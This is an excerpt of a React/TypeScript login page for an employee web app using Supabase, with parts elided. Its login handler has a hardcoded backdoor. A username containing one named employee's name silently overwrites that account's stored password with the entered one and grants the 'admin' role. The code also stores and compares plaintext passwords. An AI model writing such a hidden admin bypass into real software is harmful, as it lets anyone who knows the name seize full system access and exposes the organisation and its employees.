...
export default function Login({ setUser }) {
  ...
  const handleLogin = async (e: React.FormEvent) => {
    ...
    try {
      ...
      // Special case for Sabrina Wofford - give full admin access
      if (username.toLowerCase().includes("sabrina") && username.toLowerCase().includes("wofford")) {
        ...
        if (findError || !sabrina) {
          ...
          // Update Sabrina's password if it doesn't match
          if (sabrina.password !== password.trim()) {
            const { error: updateError } = await supabase
              .from("employees")
              .update({ password: password.trim(), role: "admin" })
              .eq("id", sabrina.id)
        ...
        toast({ title: "Welcome Admin!", description: "Full system access granted." })
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 },
    ...
    <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}>
      <Card className="w-full max-w-md mx-auto bg-gradient-to-br from-roadhouseWhite to-roadhouseYellow/20 text-roadhouseBlack shadow-2xl border-4 border-roadhouseRed">
        <CardHeader className="space-y-2 bg-roadhouseRed/10 rounded-t-lg">
          ...
          <CardTitle className="text-2xl font-bold text-center text-roadhouseRed">LEGENDARY FOOD - LEGENDARY - SERVICE      </CardTitle>
          <p className="text-center text-roadhouseBlack font-semibold opacity-15 italic text-xs">                               Armadollars has no affiliation with DBPR - TEXAS ROADHOUSE HOLDINGS LLC        </p>
        </CardHeader>
